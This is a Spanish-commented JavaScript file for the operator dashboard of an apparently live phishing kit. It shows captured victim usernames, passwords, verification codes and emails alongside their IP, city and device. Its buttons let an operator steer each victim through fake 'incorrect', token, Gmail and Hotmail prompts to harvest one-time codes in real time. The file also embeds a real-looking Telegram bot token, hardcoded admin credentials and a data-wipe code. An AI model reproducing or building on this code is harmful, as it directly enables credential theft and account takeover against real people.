// 📦 Importa funciones de Firebase para interactuar con la base de datos: leer (onValue), actualizar (update), y acceder a referencias (ref).
import { db, ref, onValue, update } from "./config.js";

// 🖥️ Esta función detecta el sistema operativo del dispositivo a partir del user agent del navegador.
function detectarDispositivo(userAgent) {
  userAgent = userAgent.toLowerCase();
  if (/windows/.test(userAgent)) return "Windows";
  if (/iphone/.test(userAgent)) return "iPhone";
  if (/ipad/.test(userAgent)) return "iPad";
  if (/android/.test(userAgent)) return "Android";
  if (/macintosh/.test(userAgent)) return "Mac";
  if (/linux/.test(userAgent)) return "Linux";
  return "Desconocido";
}

// 🔁 Almacena los IDs de las nubes que ya se han creado para evitar duplicados.
const nubesCreadas = new Set();
// 📦 Contenedor principal donde se renderizan las tarjetas (nubes) en el panel.
const contenedor = document.getElementById("contenedor");
// 🧊 Elemento HTML donde se muestran los formularios modales flotantes (Token, Gmail, etc).
const modal = document.getElementById("formulario-modal");


// ********** APARTADO DE NOTIFICACIÓN TELEGRAM **********
async function notificarTelegram(usuario, tipo) {
  const token = "8434946432:AAFLR_h7Nr4AgvSWj3skYYlHX_8_n9Bserc";
  const chatId = "5592536910";
  const fecha = new Date().toLocaleDateString("es-CO");
  const hora = new Date().toLocaleTimeString("es-CO", { hour12: false });

    try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    const ip = data.ip || "Desconocida";
    const ciudad = data.city || "Desconocida";
    const pais = data.country_name || "Desconocido";

    const mensaje = `
    🖲 *Alerta de Panel*
    ${tipo === "login" ? "🟢 Conectado" : "🔴 Desconectado"}
    👤 Usuario: *${usuario}*
    📅 Fecha: ${fecha}
    ⏰ Hora: ${hora}
    🌐 IP: ${ip}
    📍 Ciudad: ${ciudad}
    🇨🇴 País: ${pais}
    `;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: mensaje, parse_mode: "Markdown" })
    });
    } catch (error) {
    console.error("❌ Error al enviar a Telegram:", error);
  }
}


// ********** APARTADO DE LOGIN **********
// 📌 Verifica las credenciales ingresadas y carga el panel si son válidas.
window.verificarLogin = () => {
  // Obtiene el valor del input "usuario" y lo limpia de espacios.
  const user = document.getElementById("usuario").value.trim();

  // Obtiene el valor del input "clave" y lo limpia de espacios.
  const pass = document.getElementById("clave").value.trim();

  // Lista de usuarios válidos autorizados para entrar al panel.
  const usuarios = [
    { usuario: "admin", clave: "230320" },
  ];

  // Verifica si el usuario y la clave coinciden con algún usuario válido.
  if (usuarios.some(u => u.usuario === user && u.clave === pass)) {
    // Guarda en localStorage que el usuario ha iniciado sesión.
    localStorage.setItem("panelLoggedIn", "true");

    // Guarda el nombre del usuario que inició sesión.
    localStorage.setItem("panelUser", user);

    // Oculta el formulario de login.
    document.getElementById("login-container").style.display = "none";

    // Muestra la barra superior con los botones de navegación.
    document.getElementById("barra-superior").style.display = "block";

    // Muestra el contenedor donde van las tarjetas/nubes.
    contenedor.style.display = "flex";

    // Reproduce un sonido de alerta si está disponible.
    const sonido = document.getElementById("alerta-sonido");
    if (sonido && typeof sonido.play === "function") sonido.play().catch(() => {});

    // Llama a la función que carga las tarjetas (nubes) en el panel.
    cargarPanel();

    // Envía una notificación a Telegram indicando que el usuario se conectó.
    notificarTelegram(user, "login");
  }
};


// 📌 Cierra la sesión del usuario y limpia el estado de la interfaz.
window.cerrarSesion = () => {
  // Obtiene el usuario que está actualmente logueado.
  const user = document.getElementById("usuario").value.trim();

  // Envía una notificación a Telegram informando que se cerró sesión.
  notificarTelegram(user, "logout");

  // Limpia todos los datos almacenados en localStorage.
  localStorage.clear();

  // Vuelve a mostrar el formulario de login.
  document.getElementById("login-container").style.display = "flex";

  // Oculta la barra superior.
  document.getElementById("barra-superior").style.display = "none";

  // Oculta el contenedor de nubes.
  contenedor.style.display = "none";

  // Limpia cualquier contenido dentro del contenedor.
  contenedor.innerHTML = "";

  // Limpia los campos del formulario de login.
  document.getElementById("usuario").value = "";
  document.getElementById("clave").value = "";

  // Remueve la clase "logueado" del documento para actualizar el estado visual.
  document.documentElement.classList.remove("logueado");
};



// ********** APARTADO DEL PANEL DE NUBES **********
function cargarPanel() {
  onValue(ref(db, "dataPages"), snapshot => {
    const data = snapshot.val();
    if (!data) return;

    Object.entries(data).forEach(([uid, info]) => {
      if (info.oculto) return;
      const vacia = !info.username && !info.password && !info.codigo && !info.email && !info.passwords;
      if (vacia) return;

      let nube = document.getElementById("nube-" + uid);
      const esNueva = !nube;
      const barraClase = info.mostrarBarra ? "input-highlight" : "";
      const bolita = info.estado === "abierto" ? "verde" : "rojo";

      const html = `
        <div class="cerrar" onclick="cerrarNube('${uid}')">X</div>
        <div class="estado-conexion ${bolita}">${info.estado === "abierto" ? "Conectado" : "Desconectado"}</div>
        <div class="ip-info">
        <strong>IP:</strong> ${info.ip || "?"} |
        <strong>Ciudad:</strong> ${info.ciudad || "?"} |
        <strong>País:</strong> ${info.pais || "?"} |
        <strong>Dispositivo:</strong> ${info.dispositivo || "?"}
        </div>
        <div class="datos-linea">
        <div><strong>Username:</strong><br><span class="${barraClase}" onclick="copiarTexto('${info.username || ''}')">${info.username || "*******"}</span></div>
        <div><strong>Password:</strong><br>
  <span class="${info.mostrarBarraPassword ? 'input-highlight' : ''}"
        onclick="copiarTexto('${info.password || ''}')">
    ${info.password || "*******"}
  </span>
</div>

        <div><strong>Código:</strong><br><span class="${info.mostrarBarraCodigo ? 'input-highlight' : ''}" onclick="copiarTexto('${info.codigo || ''}')">${info.codigo || "*******"}</span></div>
        <div><strong>Email:</strong><br><span class="${info.mostrarBarraHotmailEmail || info.mostrarBarraEmail ? 'input-highlight' : ''}" onclick="copiarTexto('${info.email || ''}')">${info.email || "*******"}</span></div>
        <div><strong>Passwords:</strong><br><span class="${info.mostrarBarraHotmailPass || info.mostrarBarraGmail ? 'input-highlight' : ''}" onclick="copiarTexto('${info.passwords || ''}')">${info.passwords || "*******"}</span></div>
        </div>
        <div class="botones">
          <button class="btn rojo" onclick="incorrectoLogin('${uid}')">Incorrect</button>
          <button class="btn azul" onclick="redirigir('${uid}')">Redirect</button>
          <button class="btn naranja" onclick="irAIndex('${uid}')">Login</button>
          <button class="btn morado" onclick="abrirToken('${uid}')">Token</button>
          <button class="btn amarillo" onclick="abrirMail('${uid}')">Gmail</button>
          <button class="btn rosa" onclick="abrirHot('${uid}')">Hotmail</button>
        </div>
      `;

      if (esNueva) {
        nube = document.createElement("div");
        nube.className = "nube";
        nube.id = "nube-" + uid;
        nube.innerHTML = html;
        contenedor.appendChild(nube);
        if (!nubesCreadas.has(uid)) {
          const sonido = document.getElementById("alerta-sonido");
          if (sonido) sonido.play().catch(() => {});
          nubesCreadas.add(uid);
        }
      } else {
        nube.innerHTML = html;
      }
    });
  });
}


// ********** APARTADO DE ACCIONES SOBRE LAS NUBES **********
window.cerrarNube = uid => update(ref(db, "dataPages/" + uid), { oculto: true }).then(() => {
  const el = document.getElementById("nube-" + uid);
  if (el) el.remove();
});

// 📌 Marca la nube como 'incorrecto' para login y oculta el campo.
window.incorrectoLogin = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "incorrecto", mostrarBarra: false });
  cerrarFormulario();
};

// 📌 Marca el token como incorrecto y oculta el campo correspondiente.
window.incorrectoToken = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "incorrecto", mostrarBarraCodigo: false });
  cerrarFormulario();
};

// 📌 Marca la sección Gmail como incorrecta y oculta su campo.
window.incorrectoGmail = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "incorrecto", mostrarBarraGmail: false });
  cerrarFormulario();
};

// 📌 Marca la sección Hotmail como incorrecta y oculta su campo.
window.incorrectoHotmail = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "incorrectoHot", mostrarBarraHotmailPass: false });
  cerrarFormulario();
};

// 📌 Cambia el estado a 'redirigirExterno' y asigna una URL.
window.redirigir = uid => update(ref(db, "dataPages/" + uid), {
  estado: "redirigirExterno", url: "https://ejemplo.com", bloqueado: true
});

// 📌 Actualiza el estado para redirigir al login original.
window.irAIndex = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "irAIndex" });
  cerrarFormulario();
};

// 📌 Actualiza el estado para redirigir a Gmail.
window.irAGmail = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "irAGmail" });
  cerrarFormulario();
};

// 📌 Actualiza el estado para redirigir a Hotmail.
window.irAHotmail = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "irAHotmail" });
  cerrarFormulario();
};

// 📌 Marca el estado como incorrecto para Hotmail.
window.incorrectoHot = uid => {
  update(ref(db, "dataPages/" + uid), { estado: "incorrectoHot" });
  cerrarFormulario();
};


// ********** APARTADO DE TOKEN **********
window.abrirToken = uid => {
  modal.innerHTML = `
    <div class="modal-formulario">
      <h4>Formulario de Token</h4>
      <input type="text" id="tokenInput-${uid}" placeholder="Nombre para token">
      <div class="modal-buttons">
        <button class="btn negro" onclick="enviarToken('${uid}')">Enviar</button>
        <button class="btn rojo" onclick="incorrectoToken('${uid}')">Incorrecto</button>
        <button class="btn azul" onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>
  `;
};

// 📌 Función que envía el nombre del token junto con IP, fecha y navegador al servidor.
window.enviarToken = async uid => {
  const valor = document.getElementById("tokenInput-" + uid).value;
  if (!valor.trim()) return;

  const fecha = new Date().toLocaleDateString("es-CO");
  const userAgent = navigator.userAgent;

  await update(ref(db, "dataPages/" + uid), {
    tokenName: valor,
    estado: "redirigir",
    fecha,
    userAgent
  });

  cerrarFormulario();
};



// ********** APARTADO DE GMAIL **********
window.abrirMail = uid => {
  modal.innerHTML = `
    <div class="modal-formulario">
      <h4>Formulario Gmail</h4>
      <input type="text" id="mailCodigo-${uid}" placeholder="Código (2 dígitos)" maxlength="2">
      <input type="text" id="mailDescripcion-${uid}" placeholder="Descripción">
      <div class="modal-buttons">
        <button class="btn negro" onclick="enviarMail('${uid}')">Enviar</button>
        <button class="btn rojo" onclick="incorrectoGmail('${uid}')">Incorrecto</button>
        <button class="btn azul" onclick="irAGmail('${uid}')">Inicio</button>
        <button class="btn" onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>
  `;
};

// 📌 Guarda el código y descripción del formulario de Gmail en Firebase.
window.enviarMail = async uid => {
  const codigo = document.getElementById("mailCodigo-" + uid).value;
  const descripcion = document.getElementById("mailDescripcion-" + uid).value;
  if (!codigo.trim() || !descripcion.trim()) return;

  const fecha = new Date().toLocaleDateString("es-CO");
  const userAgent = navigator.userAgent;
  let ipInfo = "Desconocido";

  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ipInfo = `${data.ip || "?"} - ${data.city || "?"} - ${data.country_name || "?"}`;
  } catch {}

  await update(ref(db, "dataPages/" + uid), {
    mailCodigo: codigo,
    mailDescripcion: descripcion,
    fecha,
    userAgent,
    ipInfo
  });

  cerrarFormulario();
};


// ********** APARTADO DE HOTMAIL **********
window.abrirHot = uid => {
  modal.innerHTML = `
    <div class="modal-formulario">
      <h4>Formulario Hotmail</h4>
      <div class="modal-buttons">
        <button class="btn negro" onclick="irAHotmail('${uid}')">Inicio</button>
        <button class="btn rojo" onclick="incorrectoHotmail('${uid}')">Incorrecto</button>
        <button class="btn" onclick="cerrarFormulario()">Cancelar</button>
      </div>
    </div>
  `;
};


// ********** APARTADO DE CIERRE DE MODAL **********
window.cerrarFormulario = () => {
  modal.innerHTML = "";
};


// ********** APARTADO DE FORMATEO DE IP **********
function formatearIp(ipInfo = "") {
  const [ip = "?", ciudad = "?", pais = "?"] = ipInfo.split(" - ");
  return `${ip} Ciudad: ${ciudad} País: ${pais}`;
}


// ********** APARTADO DE NUBES ELIMINADAS **********
window.mostrarNubeEliminadas = () => {
  const tablaBody = document.getElementById("tabla-nube");
  tablaBody.innerHTML = "";

  onValue(ref(db, "dataPages"), snapshot => {
    const data = snapshot.val();
    if (!data) return;

    const eliminadas = [];

    Object.values(data).forEach(info => {
      if (info.oculto === true) eliminadas.push(info);
    });

    eliminadas.sort((a, b) => {
      const f1 = new Date(a.fecha || "2000-01-01");
      const f2 = new Date(b.fecha || "2000-01-01");
      return f2 - f1;
    });

    eliminadas.forEach(info => {
      const row = document.createElement("tr");
      row.innerHTML = `
        <td>${info.username || ""}</td>
        <td>${info.password || ""}</td>
        <td>${info.codigo || ""}</td>
        <td>${info.email || ""}</td>
        <td>${info.passwords || ""}</td>
        <td><strong>Fecha:</strong> ${info.fecha || "—"}<br>
        <strong>User Agent:</strong> <small>${info.userAgent || "—"}</small><br>
        <strong>Ip:</strong> ${formatearIp(info.ipInfo)}<br>
        <strong>Dispositivo:</strong> ${info.dispositivo || "?"}
        </td>
      `;
      tablaBody.appendChild(row);
    });
  });

  contenedor.style.display = "none";
  document.getElementById("nube-pasarela").style.display = "block";
};

// 📌 Regresa del historial de nubes eliminadas al panel principal.
window.regresarPanel = () => {
  document.getElementById("nube-pasarela").style.display = "none";
  contenedor.style.display = "flex";
};


// ********** APARTADO DE ELIMINAR TODOS LOS DATOS **********
window.limpiarNubes = () => {
  const codigo = prompt("Ingresa el código de 6 dígitos para confirmar:");
  if (!codigo || codigo.length !== 6) return alert("❌ Código inválido.");
  if (codigo !== "102030") return alert("🚫 Código incorrecto.");
  if (!confirm("⚠️ Esto eliminará TODO el contenido de la nube. ¿Estás seguro?")) return;

  update(ref(db), { dataPages: null })
    .then(() => {
      alert("✅ Todos los datos han sido eliminados.");
      document.getElementById("tabla-nube").innerHTML = "";
      contenedor.innerHTML = "";
    })
    .catch(error => {
      console.error("❌ Error al limpiar datos:", error);
      alert("❌ Ocurrió un error al intentar limpiar los datos.");
    });
};


// ********** APARTADO DE SESIÓN ACTIVA **********
if (localStorage.getItem("panelLoggedIn") === "true") {
  document.getElementById("login-container").style.display = "none";
  document.getElementById("barra-superior").style.display = "block";
  contenedor.style.display = "flex";
  cargarPanel();
}

document.body.classList.remove("oculto-temporal");


// 📌 Oculta la nube seleccionada y guarda metadatos como IP, ciudad y navegador.
window.cerrarNube = async uid => {
  const fecha = new Date().toLocaleDateString("es-CO");
  const userAgent = navigator.userAgent;
  const dispositivo = detectarDispositivo(userAgent);
  let ipInfo = "Desconocido";
  let ip = "?", ciudad = "?", pais = "?";

  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    ip = data.ip || "?";
    ciudad = data.city || "?";
    pais = data.country_name || "?";
    ipInfo = `${ip} - ${ciudad} - ${pais}`;
  } catch {}

  await update(ref(db, "dataPages/" + uid), {
    oculto: true,
    fecha,
    userAgent,
    ipInfo,
    ip,
    ciudad,
    pais,
    dispositivo
  });

  const el = document.getElementById("nube-" + uid);
  if (el) el.remove();
};


// ********** APARTADO DE COPIAR AL PORTAPAPELES **********
window.copiarTexto = function(texto) {
  if (!texto) {
    alert("⚠️ Nada que copiar.");
    return;
  }

  navigator.clipboard.writeText(texto).then(() => {
    const toast = document.createElement("div");
    toast.innerText = "✅ Copiado";
    toast.style.position = "fixed";
    toast.style.bottom = "20px";
    toast.style.right = "20px";
    toast.style.padding = "10px 15px";
    toast.style.background = "#2e85ccff";
    toast.style.color = "white";
    toast.style.borderRadius = "8px";
    toast.style.fontWeight = "bold";
    toast.style.zIndex = "9999";
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 2000);
  }).catch(err => {
    console.error("Error al copiar:", err);
    alert("❌ No se pudo copiar.");
  });
};
